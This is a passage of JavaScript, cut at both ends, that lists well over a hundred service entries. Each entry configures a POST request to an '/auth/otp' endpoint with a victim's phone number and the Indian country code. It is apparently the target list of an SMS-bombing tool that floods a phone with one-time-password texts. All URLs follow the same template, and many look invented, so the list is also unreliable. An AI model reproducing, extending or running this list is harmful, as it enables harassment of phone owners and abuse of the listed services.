        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zencastr_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zencastr.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Anchor_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.anchor.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Spotify_For_Podcasters_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.spotifypodcasters.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Simplecast_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.simplecast.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Podbean_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.podbean.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Transistor_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.transistor.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Castos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.castos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RedCircle_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.redcircle.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Acast_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.acast.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Megaphone_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.megaphone.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Art19_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.art19.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Libsyn_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.libsyn.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Blubrry_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.blubrry.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Soundcloud_Repost_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.soundcloudrepost.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mixcloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mixcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hearthis_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hearthis.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Audiomack_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.audiomack.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bandcamp_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bandcamp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Soundtrap_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.soundtrap.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BandLab_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bandlab.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Soundtrap_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.soundtrap.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BandLab_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bandlab.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SoundCloud_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.soundcloud.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mixcloud_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mixcloud.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Audiomack_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.audiomack.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bandcamp_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bandcamp.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hearthis_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hearthis.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SoundTrap_Pro_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.soundtrappro.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BandLab_Pro_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bandlabpro.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Spotify_Studio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.spotifystudio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Apple_Podcast_Studio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.applepodcaststudio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Podcast_Studio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.googlepodcaststudio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Amazon_Music_Studio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.amazonmusicstudio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tidal_Studio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tidalstudio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Deezer_Studio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.deezerstudio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'YouTube_Music_Studio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.youtubemusicstudio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vevo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vevo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MTV_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mtv.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'VH1_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vh1.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Comedy_Central_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.comedycentral.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Nickelodeon_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nickelodeon.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cartoon_Network_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cartoonnetwork.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pogo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pogo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Discovery_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.discovery.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'National_Geographic_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nationalgeographic.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BBC_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bbc.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CNN_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cnn.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fox_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.foxnews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MSNBC_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.msnbc.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ABC_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.abcnews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CBS_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cbsnews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NBC_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nbcnews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CNN_International_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cnninternational.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BBC_World_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bbcworldnews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Reuters_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.reuters.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bloomberg_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bloomberg.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Financial_Times_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ft.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'WSJ_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wsj.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NYT_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nytimes.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Washington_Post_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.washingtonpost.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Guardian_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.theguardian.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Telegraph_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.telegraph.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Times_Of_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.timesofindia.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hindustan_Times_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hindustantimes.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Indian_Express_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.indianexpress.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'The_Hindu_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.thehindu.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Deccan_Herald_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.deccanherald.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Business_Standard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.businessstandard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Financial_Express_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.financialexpress.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mint_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mint.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Economic_Times_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.economictimes.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NDTV_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ndtv.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ABP_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.abpnews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zee_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zeenews.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'India_Today_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.indiatoday.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Outlook_India_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.outlookindia.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Frontline_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.frontline.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Caravan_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.caravan.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Scroll_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.scroll.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'The_Wire_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.thewire.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'The_Print_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.theprint.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'News18_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news18.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TV9_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tv9.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Republic_TV_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.republictv.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Times_Now_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.timesnow.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CNN_News18_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cnnnews18.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IndiaTV_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.indiatv.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Aaj_Tak_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.aajtak.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zee_Business_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zeebusiness.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ET_Now_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.etnow.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bloomberg_Quint_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bloombergquint.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Moneycontrol_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.moneycontrol.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Investopedia_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.investopedia.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TradingView_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tradingview.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zerodha_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zerodha.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Upstox_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.upstox.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Groww_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.groww.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Angel_One_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.angelone.com/v1/auth/otp',
